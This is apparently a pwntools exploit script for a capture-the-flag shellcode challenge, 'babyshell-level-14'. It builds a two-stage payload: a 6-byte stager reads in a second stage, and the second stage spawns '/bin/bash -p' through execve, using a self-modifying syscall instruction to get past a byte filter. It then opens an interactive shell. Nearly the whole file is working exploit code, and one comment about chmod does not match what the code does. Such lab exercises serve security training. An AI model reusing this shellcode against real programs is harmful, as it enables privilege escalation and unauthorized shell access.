from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './challenge/babyshell-level-14'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, cyclic(500))
# win = elf.symbols['win']

# CHALLENGE DESC
# Write and execute shellcode to read the flag, but this time you only get 6 bytes!
# With a restriction this small, the only way is to use a two staged shellcode

# The first stage code, relies on chance (this is okay, as sometimes vulnerabilities aren't deterministic)
# Even if this is unreliable its still a good way to do it

first_stage = """
    push rax
    pop rdi

    push rdx
    pop rsi

    syscall
    """

second_stage = """
    push 0x68
    push 0x6e69622f
    mov dword ptr [rsp+4], 0x7361622f 
    push rsp
    pop rdi

    xor edx, edx
    xor eax, eax

    push 0x702d
    push rsp
    pop rsi

    push 0
    push rsi
    push rdi
    push rsp
    pop rsi

    mov al, 59
    inc byte ptr[rip]
    .byte 0x0e
    .byte 0x05
"""

# CHMOD with flag as path (not /flag)
# This means the python script needs to be run inside the '/' directory '/home/hacker'
# then in the workspace, cat flag

import time

shellcode1 = asm(first_stage)
shellcode2 = asm(second_stage)
print(shellcode1)
print(len(shellcode1))

io = start()

payload1 = flat([shellcode1])
payload2 = flat([shellcode2])

payload = payload1
open("payload", "wb").write(payload)

io.send(payload1)
time.sleep(1)
io.send(payload2)

io.interactive()
